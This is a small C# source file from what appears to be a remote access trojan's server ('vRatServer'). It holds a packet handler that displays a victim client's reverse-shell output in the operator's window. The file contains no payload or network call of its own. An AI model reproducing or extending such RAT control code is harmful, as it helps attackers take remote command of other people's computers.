using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class ReverseShellPacket
    {
        Client client;

        public ReverseShellPacket(Client client, byte[] data)
        {
            this.client = client;
            if (client.rsf != null)
            {
                Program.f1.BeginInvoke((MethodInvoker)delegate {

                    client.rsf.update_text(System.Text.Encoding.UTF8.GetString(data));

                });
                
            }



            return;



        }
    }
}
